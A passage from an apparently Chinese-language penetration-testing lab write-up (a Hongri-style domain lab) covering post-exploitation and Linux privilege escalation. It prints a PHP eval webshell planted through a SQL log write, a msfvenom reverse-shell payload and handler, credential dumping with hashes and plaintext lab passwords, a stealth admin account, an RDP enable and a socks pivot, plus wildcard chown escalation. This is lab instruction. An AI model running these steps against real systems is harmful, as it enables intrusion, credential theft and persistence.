SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;               		   #执行该语句，会将该命令写入日志文件</code></pre></div>

<p>执行完命令，便可以在网站根目录下看到<code>hack.php</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162058801.png" srcset="/img/loading.gif" alt="image-20210511162058801"></p>
<p>浏览器访问<code>http://192.168.74.129/yxcms/hack.php</code>，一句话木马访问成功</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511162146968.png" srcset="/img/loading.gif" alt="image-20210511162146968" style="zoom:50%;">

<h2 id="后渗透攻击"><a href="#后渗透攻击" class="headerlink" title="后渗透攻击"></a>后渗透攻击</h2><p>在拿到了Web服务器的权限后，我们就要尽可能多的搜集该服务器的信息，然后搭建隧道通往内网。</p>
<p>执行<code>whoami</code> ,<code>ipconfig</code>,<code>net localgroup administrators</code>命令我们知道当前的用户身份是 <code>administrator</code> ，在管理员组中，并且处在域 god 中。该主机有两张网卡，分别是：192.168.74.129，192.168.52.143</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162608469.png" srcset="/img/loading.gif" alt="image-20210511162608469" style="zoom: 50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162902010.png" srcset="/img/loading.gif" alt="image-20210511162902010" style="zoom: 80%;"></p>
<h3 id="获取MSF-shell"><a href="#获取MSF-shell" class="headerlink" title="获取MSF shell"></a>获取MSF shell</h3><p>使用<code>msf</code>生成木马</p>
<ul>
<li><p>kali终端输入<code>msfconsole</code>，进入msf</p>
</li>
<li><p>选择带reverse和meterpreter(发送端接受端连接)的payloads进行反弹端口</p>
<div class="hljs"><pre><code class="hljs awk">use windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp</code></pre></div>

<p>输入<code>show options</code>查看方法</p>
</li>
<li><p>新开一个终端输入以下命令，生成木马文件，并利用蚁剑上传到目标主机中</p>
</li>
</ul>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp lhost=<span class="hljs-number">192.168.74.130</span> lport=<span class="hljs-number">4444</span> -f exe -o <span class="hljs-number">1</span>.exe</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511163917527.png" srcset="/img/loading.gif" alt="image-20210511163917527" style="zoom: 67%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511164107563.png" srcset="/img/loading.gif" alt="image-20210511164107563" style="zoom: 50%;">

<ul>
<li><p>再次输入msfconsole 进入应用，输入<code>use exploit/multi/handler</code>进入管理工具，获取shell权限，命令如下</p>
<div class="hljs"><pre><code class="hljs routeros">use exploit/multi/handler
<span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter_reverse_tcp
<span class="hljs-builtin-name">set</span> lhost kali<span class="hljs-string">&#x27;s ip</span>
<span class="hljs-string">run</span></code></pre></div>

<p>即可获取shell</p>
</li>
</ul>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511165317518.png" srcset="/img/loading.gif" alt="image-20210511165317518" style="zoom:67%;">



<h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><p>在<code>meterpreter</code>中运行<code>run windows/gather/smart_hashdump</code>,但是出现错误，提示需要system进程权限</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511182726579.png" srcset="/img/loading.gif" alt="image-20210511182726579" style="zoom:67%;">

<p>使用<code>migrate 388</code>将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的</p>
<p>再使用<code>run windows/gather/smart_hashdump</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183026072.png" srcset="/img/loading.gif" alt="image-20210511183026072" style="zoom: 50%;">

<p>接下来是破解该密码</p>
<p><strong>加载 kiwi模块</strong></p>
<div class="hljs"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span>
<span class="hljs-attribute">creds_all</span></code></pre></div>

<p>结果如下</p>
<div class="hljs"><pre><code class="hljs armasm"><span class="hljs-symbol">meterpreter</span> &gt; creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
<span class="hljs-symbol">msv</span> credentials
===============

<span class="hljs-symbol">Username</span>       Domain  LM                                NTLM                              SHA1
--------       ------  --                                ----                              ----
<span class="hljs-symbol">Administrator</span>  GOD     edea194d76c77d87840ac10a764c7362  <span class="hljs-number">8</span>a963371a63944419ec1adf687bb1be5  <span class="hljs-number">343</span>f44056ed02360aead5618dd42e4614b5f70cf
<span class="hljs-symbol">STU1$</span>          GOD                                       cde51539f42c2854d74e82db1173dd8c  <span class="hljs-number">50950</span>d918317edf0ab95661a565c6ebf1151fe3b

<span class="hljs-symbol">wdigest</span> credentials
===================

<span class="hljs-symbol">Username</span>       Domain  Password
--------       ------  --------
(null)         (null)  (null)
<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span>
<span class="hljs-symbol">STU1$</span>          GOD     <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b

<span class="hljs-symbol">tspkg</span> credentials
=================

<span class="hljs-symbol">Username</span>       Domain  Password
--------       ------  --------
<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span>

<span class="hljs-symbol">kerberos</span> credentials
====================

<span class="hljs-symbol">Username</span>       Domain   Password
--------       ------   --------
(null)         (null)   (null)
<span class="hljs-symbol">Administrator</span>  GOD.ORG  hongrisec<span class="hljs-comment">@2019</span>
<span class="hljs-symbol">stu1$</span>          GOD.ORG  <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b</code></pre></div>

<p>可以看到密码已经被破解处理</p>
<div class="hljs"><pre><code class="hljs angelscript">password：<span class="hljs-symbol">hongrisec@</span><span class="hljs-number">2019</span></code></pre></div>



<h3 id="远程桌面登录"><a href="#远程桌面登录" class="headerlink" title="远程桌面登录"></a>远程桌面登录</h3><p>已经获得了administrator的账号和密码，现在我们既可以使用administrator账号登录，也可以新建账号登录。</p>
<p>直接使用administrator登录的话可能被管理员发现，所以使用第二种方法</p>
<div class="hljs"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> hack <span class="hljs-keyword">password</span>  /<span class="hljs-keyword">add</span>
net localgroup administrators hack /<span class="hljs-keyword">add</span></code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183802017.png" srcset="/img/loading.gif" alt="image-20210511183802017" style="zoom: 50%;">

<p>查看主机是否开启<code>3389</code>端口</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">3389</span> -v <span class="hljs-number">192.168.74.129</span></code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184005186.png" srcset="/img/loading.gif" alt="image-20210511184005186" style="zoom:50%;">

<p>可以发现是关闭的。</p>
<p>使用meterpreter,打开该端口(运行之前好像需要重新弹出shell,直接运行没有成功)</p>
<div class="hljs"><pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/m</span>anage/enable_rdp</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184531850.png" srcset="/img/loading.gif" alt="image-20210511184531850" style="zoom:67%;">

<p>再次扫描就会发现3389端口已经打开</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184630200.png" srcset="/img/loading.gif" alt="image-20210511184630200" style="zoom:67%;">

<p>直接连接即可</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511185014529.png" srcset="/img/loading.gif" alt="image-20210511185014529" style="zoom:50%;">

<h3 id="添加路由、挂Socks4a代理"><a href="#添加路由、挂Socks4a代理" class="headerlink" title="添加路由、挂Socks4a代理"></a>添加路由、挂Socks4a代理</h3><ul>
<li><p>添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机</p>
</li>
<li><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p>
</li>
</ul>
<p>注：添加路由一定要在挂代理之前，因为代理需要用到路由功能</p>
<p>在获取<code>shell</code>的机器上添加路由</p>
<div class="hljs"><pre><code class="hljs routeros">meterpreter &gt; <span class="hljs-builtin-name">run</span> get_local_subnets
meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -s 192.168.21.0/24
<span class="hljs-comment"># 添加路由</span>
meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -p
<span class="hljs-comment"># 显示路由</span>
meterpreter &gt;<span class="hljs-built_in"> route </span>flush 
<span class="hljs-comment"># 删除</span></code></pre></div>

<p>使用<code>run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24</code>，查看存活的主机</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511193307727.png" srcset="/img/loading.gif" alt="image-20210511193307727" style="zoom: 50%;">

<p>然后建立<code>socks4</code>代理</p>
<div class="hljs"><pre><code class="hljs pgsql">meterpreter &gt; background
msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; use auxiliary/<span class="hljs-keyword">server</span>/socks4a
msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvhost <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvport <span class="hljs-number">1080</span>
msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run</code></pre></div>



<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511195019515.png" srcset="/img/loading.gif" alt="image-20210511195019515" style="zoom:50%;">

<p>设置完代理后攻击者主机就可以访问内网了</p>
<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><div class="hljs"><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看时间服务器</span>
net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看域用户</span>
net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#查看有几个域</span>
net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>         <span class="hljs-comment">#查看域内所有的主机名</span>
net group <span class="hljs-string">&quot;domain admins&quot;</span>   <span class="hljs-string">/domain</span>          <span class="hljs-comment">#查看域管理员</span>
net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span>       <span class="hljs-comment">#查看域控</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200502702.png" srcset="/img/loading.gif" alt="image-20210511200502702" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200553874.png" srcset="/img/loading.gif" alt="image-20210511200553874" style="zoom:50%;"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200623757.png" srcset="/img/loading.gif" alt="image-20210511200623757" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200650884.png" srcset="/img/loading.gif" alt="image-20210511200650884" style="zoom:50%;"></p>
<p>汇总</p>
<p>从域信息收集可以得到以下信息：</p>
<ul>
<li><p>域：god.org</p>
</li>
<li><p>域内有三个用户：administrator、ligang、liukaifeng01</p>
</li>
<li><p>域内有三台主机：DEV1(不在此环境中)、ROOT-TVI862UBEH、STU1</p>
</li>
<li><p>域控：OWA(192.168.52.138)</p>
</li>
<li><p>域管理员：administrator</p>
</li>
</ul>
<p>由此可见，我们现在获得的即是域管理员权限。此环境内还有一台ROOT-TVI862UBEH(192.168.52.141)和域控OWA(192.168.52.138)。</p>
<h3 id="内网主机信息收集"><a href="#内网主机信息收集" class="headerlink" title="内网主机信息收集"></a>内网主机信息收集</h3><p>远程登录桌面后会看到一个Nmap应用，可以用这个探测内网主机</p>
<p>当然之前已经设置完代理了，也可以使用kali中的msf探测</p>
<h3 id="内网存活主机探测"><a href="#内网存活主机探测" class="headerlink" title="内网存活主机探测"></a>内网存活主机探测</h3><p>因为之前的代理搭建存在问题，导致这一步不能做，就在网上找了一些相关操作</p>
<p>在域环境渗透中可以省略，因为使用域命令可以直接查询域中有哪些主机。在非域环境中渗透，可以使用这一步。在这里顺带提一下这个用法。更多的关于使用MSF进行内网探测，传送门：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/92556219">后渗透阶段之基于MSF的内网主机探测</a></p>
<div class="hljs"><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe    <span class="hljs-comment">#基于udp协议发现内网存活主机</span>
auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#基于netbios协议发现内网存活主机</span></code></pre></div>

<h3 id="内网存活主机端口扫描"><a href="#内网存活主机端口扫描" class="headerlink" title="内网存活主机端口扫描"></a>内网存活主机端口扫描</h3><p><strong>使用MSF自带模块进行端口探测</strong></p>
<div class="hljs"><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp           <span class="hljs-comment">#基于tcp进行端口扫描(默认扫描1-10000)</span></code></pre></div>

<p><strong>也可以用nmap扫描</strong></p>
<h3 id="内网存活主机服务探测"><a href="#内网存活主机服务探测" class="headerlink" title="内网存活主机服务探测"></a>内网存活主机服务探测</h3><div class="hljs"><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version            <span class="hljs-comment">#发现内网ftp服务，基于默认21端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_version            <span class="hljs-comment">#发现内网ssh服务，基于默认22端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>telnet/telnet_version      <span class="hljs-comment">#发现内网telnet服务，基于默认23端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>dns/dns_amp                <span class="hljs-comment">#发现dns服务，基于默认53端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>http/http_version          <span class="hljs-comment">#发现内网http服务，基于默认80端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>http/title                 <span class="hljs-comment">#探测内网http服务的标题</span>
auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_version            <span class="hljs-comment">#发现内网smb服务，基于默认的445端口   </span>
auxiliary<span class="hljs-regexp">/scanner/m</span>ssql/mssql_schemadump     <span class="hljs-comment">#发现内网SQLServer服务,基于默认的1433端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>oracle/oracle_hashdump     <span class="hljs-comment">#发现内网oracle服务,基于默认的1521端口 </span>
auxiliary<span class="hljs-regexp">/scanner/my</span>sql/mysql_version        <span class="hljs-comment">#发现内网mysql服务，基于默认3306端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>rdp/rdp_scanner            <span class="hljs-comment">#发现内网RDP服务，基于默认3389端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>redis/redis_server         <span class="hljs-comment">#发现内网Redis服务，基于默认6379端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>db2/db2_version            <span class="hljs-comment">#探测内网的db2服务，基于默认的50000端口</span>
auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname             <span class="hljs-comment">#探测内网主机的netbios名字</span></code></pre></div>





<h1 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h1><h2 id="通配符提权"><a href="#通配符提权" class="headerlink" title="通配符提权"></a>通配符提权</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>通配符是一个字符或一组字符，可以用来替换某些范围/类别的字符。在执行任何其他操作之前，通配符首先要经过shell进行解释。</p>
<p>下面是一些常见的通配符：</p>
<p>*   星号可以与文件名中的任意数量的字符匹配，包括0个字符。</p>
<p> ?   问号用于匹配任意单个字符。</p>
<p>[ ]  括号内包括一组字符，其中任何一个字符都可以匹配该位置上的单个字符。</p>
<p> –   []中的连字符表示字符范围。</p>
<p>~   单词开头的波浪符表示当前用户的主目录的名称。如果该字符后面是另一个用户的登录名，则表示该用户的主目录。</p>
<p><strong>利用chown的<code>--reference</code>参数提权</strong></p>
<p>–reference=&lt;参考文件或目录&gt;：把指定文件或目录的所有者与所属组，统统设置成和参考文件或目录的所有者与所属组相同。</p>
<h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><p>实验环境<code>ubuntu18.04</code></p>
<p>首先创建一个hacker用户</p>
<div class="hljs"><pre><code class="hljs ebnf"><span class="hljs-attribute">adduser hacker</span></code></pre></div>

<p>登录sunzy账号，在<code>home/sunzy/test</code> 随便写一些文件，作为实验参考对象</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417165902255.png" srcset="/img/loading.gif" alt="image-20210417165902255"></p>
<p>登录hacker账号，并且在test目录下写两个文件</p>
<p>这里需要实验su命令提升权限，并且将所有者和用户组改为hacker</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417170157713.png" srcset="/img/loading.gif" alt="image-20210417170157713"></p>
<p>其中hacker.php与’–reference=hacker.php’中的名字需要一致</p>
<p>使用root权限在<code>/home/sunzy/test/</code>执行</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">chown</span> -R hacker<span class="hljs-number">1</span>:hacker<span class="hljs-number">1</span> *.php</code></pre></div>

<p>结果如下，发现，属于<code>sunzy</code>用户的文件，现在属于hacker，这样hacker就可以对这些文件进行读写操作。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210417165619087.png" srcset="/img/loading.gif" alt="image-20210417165619087" style="zoom:50%;">





<h2 id="linux-SUID提权"><a href="#linux-SUID提权" class="headerlink" title="linux SUID提权"></a>linux SUID提权</h2><h3 id="关于SUID"><a href="#关于SUID" class="headerlink" title="关于SUID"></a>关于SUID</h3><p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</p>
<h3 id="查找具有-SUID-权限位文件"><a href="#查找具有-SUID-权限位文件" class="headerlink" title="查找具有 SUID 权限位文件"></a>查找具有 SUID 权限位文件</h3><p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p>
